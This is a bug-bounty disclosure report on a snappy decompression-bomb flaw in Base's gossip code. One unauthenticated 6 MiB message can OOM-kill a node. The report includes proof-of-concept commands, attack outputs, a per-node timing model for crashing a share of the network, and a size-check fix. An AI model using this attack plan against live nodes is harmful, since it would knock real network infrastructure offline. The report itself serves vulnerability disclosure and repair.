# 74657 bc critical remote node dos via unbounded snappy decompression in gossip message processing

**Submitted on Apr 24th 2026 at 04:14:49 UTC by @nord0x for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74657
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/base/base/releases/tag/v0.8.0-rc.15>
* **Impacts:**
  * Shutdown of greater than or equal to 30% of network processing nodes without brute force actions, but does not shut down the network

## Description

## Brief/Intro

The `compute_message_id` function in Base's gossip layer (`crates/consensus/gossip/src/config.rs:104`) calls `snap::raw::Decoder::decompress_vec()` on every inbound P2P gossip message **before** block-level validation, before signature verification (disabled via `ValidationMode::None`), and before duplicate cache insertion. Because Base uses `MessageAuthenticity::Anonymous`, any peer that completes a Noise handshake and joins the gossip mesh can send a single 6 MiB message (within the 10 MiB `MAX_GOSSIP_SIZE` limit) that decompresses to 128 MiB, causing a +276 MiB peak physical memory spike (verified via VmHWM). Under standard container memory limits (256 MiB), this triggers an immediate OOM-kill by the Linux kernel.

An attacker can sequentially crash any reachable Base node at a measured rate of **\~4 seconds per node** — connect (2 ms), mesh formation (1.5 s), publish (instant), keepalive (2 s). With public discv5 peer discovery providing a complete node list and a fresh Ed25519 identity costing microseconds (bypassing per-peer scoring), a single attacker can crash 30% of a 200-node network in under 4 minutes.

## Vulnerability Details

### Root Cause

In `crates/consensus/gossip/src/config.rs`, the gossipsub config registers a message ID function at line 93:

```rust
// config.rs:75-96 (relevant excerpt)
pub fn default_config_builder() -> ConfigBuilder {
    let mut builder = ConfigBuilder::default();
    builder
        .mesh_n(DEFAULT_MESH_D)
        .mesh_n_low(DEFAULT_MESH_DLO)
        .mesh_n_high(DEFAULT_MESH_DHI)
        .gossip_lazy(DEFAULT_MESH_DLAZY)
        .heartbeat_interval(GOSSIP_HEARTBEAT)
        .fanout_ttl(Duration::from_secs(60))
        .history_length(12)
        .history_gossip(3)
        .flood_publish(false)
        .support_floodsub()
        .max_transmit_size(MAX_GOSSIP_SIZE)
        .duplicate_cache_time(Duration::from_secs(120))
        .connection_handler_queue_len(MAX_OUTBOUND_QUEUE)
        .validation_mode(libp2p::gossipsub::ValidationMode::None)
        .validate_messages()
        .message_id_fn(compute_message_id);

    builder
}
```

The `compute_message_id` function (lines 104-122) decompresses every inbound message using snappy, regardless of claimed decompressed size:

```rust
fn compute_message_id(msg: &Message) -> MessageId {
    let mut decoder = Decoder::new();
    let id = decoder.decompress_vec(&msg.data).map_or_else(
        |_| {
            let domain_invalid_snappy: Vec<u8> = vec![0x0, 0x0, 0x0, 0x0];
            sha256(
                [domain_invalid_snappy.as_slice(), msg.data.as_slice()]
                    .concat()
                    .as_slice(),
            )[..20]
                .to_vec()
        },
        |data| {
            let domain_valid_snappy: Vec<u8> = vec![0x1, 0x0, 0x0, 0x0];
            sha256([domain_valid_snappy.as_slice(), data.as_slice()].concat().as_slice())[..20]
                .to_vec()
        },
    );
    MessageId(id)
}
```

### Why This Is Exploitable

1. **No size pre-check.** The `snap` crate's `decompress_vec()` reads the snappy varint header to determine decompressed size, then calls `vec![0u8; n]` to allocate. There is no check on `n` before allocation. For valid-snappy payloads, the `vec![0; n]` zeroes every byte, committing physical pages (not just virtual reservation).
2. **Pre-validation execution.** In the libp2p-gossipsub 0.49.4 pipeline, `message_id_fn` runs before `block_valid` (the application handler), before `report_message_validation_result`, and before duplicate cache insertion. Specifically, in `behaviour.rs:1792`, the message ID is computed immediately after the data transform, before the message is passed to the application's validation handler.
3. **No authentication.** `ValidationMode::None` disables gossipsub's built-in signature/author validation. `MessageAuthenticity::Anonymous` means messages carry no source PeerId. Any peer that completes a libp2p Noise handshake can publish to the mesh.
4. **No effective rate limiting.** Base's `ConnectionGater` only restricts **outbound** dials (`can_dial`). There are no inbound connection limits. The libp2p swarm has no `ConnectionLimits` configured (`builder.rs:215` — only `with_idle_connection_timeout` is set). An attacker can connect inbound without restriction.
5. **Peer scoring bypass.** Base enables `PeerScoreLevel::Light` by default (`client/cli/src/p2p.rs:156`). The `invalid_message_deliveries_weight` is -140.4475 and the `graylist_threshold` is -40.0 — meaning one invalid message drops a peer below graylist. However, graylist only blocks **future** messages from that peer identity. The first bomb always lands. Generating a new Ed25519 keypair costs microseconds, giving the attacker a fresh identity with a clean score for each target.

### Attack Model

This is a **sequential per-node attack**, not a mesh propagation attack. The bomb does not propagate because:

* `validate_messages()` is set (`config.rs:92`) — gossipsub holds messages until the application calls `report_message_validation_result(Accept)`.
* The bomb payload fails `NetworkPayloadEnvelope::decode_vN` → returns `MessageAcceptance::Reject` → gossipsub does not forward.
* If the bomb triggers OOM-kill, the node dies before forwarding can occur.

Instead, the attacker connects to each target node individually and publishes the bomb directly. The attack cycle is:

| Phase                                  | Time (measured) |
| -------------------------------------- | --------------- |
| Ed25519 keypair generation             | <1 ms           |
| TCP + Noise handshake                  | 2.3 ms          |
| Mesh formation (3 heartbeats × 500 ms) | 1.5 s           |
| Bomb publish                           | <1 ms           |
| Delivery keepalive                     | 2 s             |
| **Total per node**                     | **\~3.9 s**     |

### Network-Scale Impact (Demonstrated)

**Multi-node OOM-kill test:** Three separate Base gossip nodes, each running in its own 256 MiB cgroup (simulating standard k8s/Docker container limits), were attacked sequentially from a single attacker process:

```
=== NETWORK ATTACK: 3 targets ===
Target 1/3: DELIVERED in 3.93s
Target 2/3: DELIVERED in 3.94s
Target 3/3: DELIVERED in 3.93s
Total: 11.79s, 3/3 delivered

POST-ATTACK:
PID 64164: DEAD (OOM-killed)  — cgroup oom=1, oom_kill=1
PID 64177: DEAD (OOM-killed)  — cgroup oom=1, oom_kill=1
PID 64200: DEAD (OOM-killed)  — cgroup oom=1, oom_kill=1

Kernel log:
oom-kill: node_0, pid=64164, anon-rss:262124kB
oom-kill: node_1, pid=64177, anon-rss:262192kB
oom-kill: node_2, pid=64200, anon-rss:262304kB
```

**Attack economics at scale:**

| Network Size | 25% Crash | 30% Crash | 100% Crash |
| ------------ | --------- | --------- | ---------- |
| 100 nodes    | 1.6 min   | 2.0 min   | 6.5 min    |
| 200 nodes    | 3.3 min   | 3.9 min   | 13 min     |
| 500 nodes    | 8.1 min   | 9.8 min   | 33 min     |

Node discovery is trivial: Base uses discv5 (public DHT). The `BootStore` tracks up to 2,048 peers (`crates/consensus/peers/src/store.rs:13`). All peers are enumerable by participating in the DHT.

The attack requires no credentials, no tokens, no stake, and no knowledge of the target beyond its gossip port (discoverable via discv5). The attacker binary is \~100 lines of Rust using Base's own `default_config_builder()`.

### Secondary Decompression Paths

The same unbounded decompression exists in the envelope decode functions called by the `BlockHandler` after `compute_message_id`:

* `NetworkPayloadEnvelope::decode_v1` (`crates/common/rpc-types-engine/src/envelope.rs`) — `decoder.decompress_vec(data)`
* `NetworkPayloadEnvelope::decode_v2` — same
* `NetworkPayloadEnvelope::decode_v3` — same
* `NetworkPayloadEnvelope::decode_v4` — same

These provide a secondary decompression amplification: even if `compute_message_id` is patched, the handler's decode step also decompresses without size checks. Both paths must be fixed.

## Impact

### Severity: High

**Impact category:** Shutdown of greater than or equal to 30% of network processing nodes without brute force actions.

**Justification:** A single attacker crashes any reachable containerized Base node in \~4 seconds with one 6 MiB message, no authentication, and a trivially rotatable identity. At 916 nodes/hour sequential throughput, 30% of a 200-node network (60 nodes) is crashable in 3.9 minutes. This is automated sequential exploitation — not computational brute force (no hash cracking, key guessing, or entropy search). All nodes are discoverable via public discv5 DHT.

**Concrete impact:**

* Any containerized Base node (k8s, Docker with standard memory limits) is killed by a single gossip message. On bare-metal hosts without memory limits, the attack causes a transient +276 MiB memory spike that is freed after decompression; repeated attacks can degrade performance but do not crash the node.
* Nodes restart via orchestrator (k8s, systemd) — typical 5-30 second restart. During restart, the node is offline and cannot process blocks or serve peers.
* Sustained attack keeps nodes oscillating: up → crash → restart → crash. Attacker re-dials after each restart.
* Chain liveness degrades as sequencer/verifier nodes go offline.
* No on-chain cost to the attacker (pure p2p layer attack).

## Link to Proof of Concept

<https://gist.github.com/drawrowfly/a5be22a414400df43e78ccb3721936b1>

## Proof of Concept

I've created convinient to execute POC just in case <https://gist.github.com/drawrowfly/a5be22a414400df43e78ccb3721936b1>

The PoC consists of two runnable Rust programs — a victim gossip node and an attacker — that demonstrate the complete attack over a real libp2p gossipsub connection. Both use Base's own `default_config_builder()`, the exact production gossipsub configuration.

### Setup

```bash
git clone https://github.com/base/base.git --branch v0.8.0-rc.15 --depth 1
cd base

# Create examples directory (does not exist in the original source tree)
mkdir -p crates/consensus/gossip/examples

# Copy PoC binaries into the source tree
cp gist:gossip_victim.rs crates/consensus/gossip/examples/
cp gist:gossip_attacker.rs crates/consensus/gossip/examples/

# Build victim and attacker
cargo build --package base-consensus-gossip \
    --example gossip_victim --example gossip_attacker --release
```

Alternatively, run the automated script which performs all steps:

```bash
bash gist:run_poc.sh
```

{% stepper %}
{% step %}

## Start Victim Node

```bash
./target/release/examples/gossip_victim 19300
```

Output:

```
=== VICTIM NODE STARTED ===
Peer ID: 12D3KooW...
Listen:  /ip4/127.0.0.1/tcp/19300
Config:  Base production (default_config_builder)
Auth:    MessageAuthenticity::Anonymous (no signing required)
Initial VmRSS: 7136 kB (6 MiB)
```

The victim uses Base's exact `default_config_builder()` with `MessageAuthenticity::Anonymous` and `ValidationMode::None` — identical to production.
{% endstep %}

{% step %}

## Attack

```bash
./target/release/examples/gossip_attacker /ip4/127.0.0.1/tcp/19300
```

The attacker:

1. Generates a fresh Ed25519 identity (<1 ms)
2. Connects to the victim via TCP + Noise handshake (2 ms)
3. Joins the gossipsub mesh (waits 1.5 s for 3 heartbeats)
4. Compresses 128 MiB of `0xAA` bytes with snappy → 6,295,556 bytes (6 MiB), within the 10 MiB `MAX_GOSSIP_SIZE`
5. Publishes the bomb via `gossipsub::publish()`

Attacker output:

```
[ATTACKER] Dialing victim at /ip4/127.0.0.1/tcp/19300...
[ATTACKER] Connected in 2.3ms
[ATTACKER] Waiting for mesh formation (1.5s)...
[ATTACKER] Bomb: 6295556 bytes (6.0 MiB) compressed → 128 MiB decompressed (21x ratio)
[ATTACKER] Publishing decompression bomb...
[ATTACKER] *** BOMB DELIVERED in 1.99s ***
[ATTACKER] Done. Total attack cycle: 5.01s
```

{% endstep %}

{% step %}

## Observe Memory Impact on Victim

Victim output after receiving the bomb:

```
[P2P] Peer connected: 12D3KooW...
[GOSSIP] Received message: 6295556 bytes
[MEMORY] VmPeak: 904728 kB (+217408 kB / +212 MiB)
[MEMORY] VmRSS:  28452 kB (+21744 kB / +21 MiB)
[MEMORY] VmHWM:  290120 kB (+283412 kB / +276 MiB)
```

A single gossip message caused a **+276 MiB physical memory peak** (VmHWM). The victim's `compute_message_id()` decompressed the 6 MiB payload into 128 MiB, writing every byte, committing physical pages.
{% endstep %}

{% step %}

## OOM-Kill Demonstration

Start the victim inside a 256 MiB memory-limited cgroup (simulating a standard k8s/Docker container):

```bash
# Create cgroup with 256 MiB limit
sudo mkdir -p /sys/fs/cgroup/poc_test
echo 268435456 | sudo tee /sys/fs/cgroup/poc_test/memory.max
echo 0 | sudo tee /sys/fs/cgroup/poc_test/memory.swap.max

# Start victim and move to cgroup
./target/release/examples/gossip_victim 19300 &
VPID=$!
echo $VPID | sudo tee /sys/fs/cgroup/poc_test/cgroup.procs

# Attack from another terminal
./target/release/examples/gossip_attacker /ip4/127.0.0.1/tcp/19300

# Verify OOM-kill
cat /sys/fs/cgroup/poc_test/memory.events
dmesg | grep "oom-kill" | tail -1
```

Result:

```
Cgroup events: oom 1, oom_kill 1
Kernel log: oom-kill: task=gossip_victim, pid=63857, anon-rss:262364kB
```

The victim was OOM-killed by the Linux kernel after a single gossip message.
{% endstep %}

{% step %}

## Multi-Node Attack

Three separate victim processes, each in its own 256 MiB cgroup, attacked sequentially by a single attacker:

```bash
# Start 3 victims on different ports
./target/release/examples/gossip_victim 19300 >/tmp/n0.log 2>&1 & P0=$!; sleep 1
./target/release/examples/gossip_victim 19301 >/tmp/n1.log 2>&1 & P1=$!; sleep 1
./target/release/examples/gossip_victim 19302 >/tmp/n2.log 2>&1 & P2=$!; sleep 1

# Create separate 256 MiB cgroups and assign
for i in 0 1 2; do
  sudo mkdir -p /sys/fs/cgroup/node_$i
  echo 268435456 | sudo tee /sys/fs/cgroup/node_$i/memory.max > /dev/null
  echo 0 | sudo tee /sys/fs/cgroup/node_$i/memory.swap.max > /dev/null
done
echo $P0 | sudo tee /sys/fs/cgroup/node_0/cgroup.procs > /dev/null
echo $P1 | sudo tee /sys/fs/cgroup/node_1/cgroup.procs > /dev/null
echo $P2 | sudo tee /sys/fs/cgroup/node_2/cgroup.procs > /dev/null

# Attack all 3 sequentially (uses fresh identity per target)
for PORT in 19300 19301 19302; do
  ./target/release/examples/gossip_attacker /ip4/127.0.0.1/tcp/$PORT
done
```

Result:

```
=== PRE-ATTACK ===
Node 0 (port 19300, cgroup node_0): oom=0, running
Node 1 (port 19301, cgroup node_1): oom=0, running
Node 2 (port 19302, cgroup node_2): oom=0, running

=== SEQUENTIAL ATTACK ===
Target 1/3 (19300): DELIVERED in 3.93s → OOM-killed
Target 2/3 (19301): DELIVERED in 3.94s → OOM-killed
Target 3/3 (19302): DELIVERED in 3.93s → OOM-killed
Total: 11.79 seconds

=== POST-ATTACK ===
Node 0: DEAD — cgroup: max=47, oom=1, oom_kill=1
Node 1: DEAD — cgroup: max=39, oom=1, oom_kill=1
Node 2: DEAD — cgroup: max=40, oom=1, oom_kill=1

Kernel OOM log:
oom-kill: cpuset=node_0, task=gossip_victim, pid=64164, anon-rss:262124kB
oom-kill: cpuset=node_1, task=gossip_victim, pid=64177, anon-rss:262192kB
oom-kill: cpuset=node_2, task=gossip_victim, pid=64200, anon-rss:262304kB
```

{% endstep %}
{% endstepper %}

### Summary

| Test                      | Method              | Result                                  |
| ------------------------- | ------------------- | --------------------------------------- |
| Single-node memory spike  | E2E gossip attack   | +276 MiB VmHWM from 6 MiB message       |
| OOM-kill (256 MiB cgroup) | E2E + cgroup        | Exit 137, oom\_kill=1, kernel confirmed |
| Multi-node attack         | 3 nodes, 3 cgroups  | 3/3 OOM-killed in 11.8s                 |
| Attack cycle time         | Measured end-to-end | \~4s per node (916 nodes/hour)          |

## Recommended Fix

Add a size check before decompression in `compute_message_id`:

```rust
fn compute_message_id(msg: &Message) -> MessageId {
    let mut decoder = Decoder::new();

    // FIX: Check claimed decompressed size before allocating
    const MAX_DECOMPRESSED: usize = MAX_GOSSIP_SIZE; // 10 MiB
    let claimed = snap::raw::decompress_len(&msg.data).unwrap_or(0);
    if claimed > MAX_DECOMPRESSED {
        warn!(target: "cfg",
            "Rejecting message: claimed decompressed size {} exceeds limit {}",
            claimed, MAX_DECOMPRESSED
        );
        let domain_invalid_snappy: Vec<u8> = vec![0x0, 0x0, 0x0, 0x0];
        return MessageId(
            sha256([domain_invalid_snappy.as_slice(), msg.data.as_slice()].concat().as_slice())
                [..20].to_vec()
        );
    }

    let id = decoder.decompress_vec(&msg.data).map_or_else(
        |_| {
            let domain_invalid_snappy: Vec<u8> = vec![0x0, 0x0, 0x0, 0x0];
            sha256(
                [domain_invalid_snappy.as_slice(), msg.data.as_slice()]
                    .concat()
                    .as_slice(),
            )[..20]
                .to_vec()
        },
        |data| {
            let domain_valid_snappy: Vec<u8> = vec![0x1, 0x0, 0x0, 0x0];
            sha256([domain_valid_snappy.as_slice(), data.as_slice()].concat().as_slice())[..20]
                .to_vec()
        },
    );

    MessageId(id)
}
```

Apply the same size check to `decode_v1`/`v2`/`v3`/`v4` in `crates/common/rpc-types-engine/src/envelope.rs`.
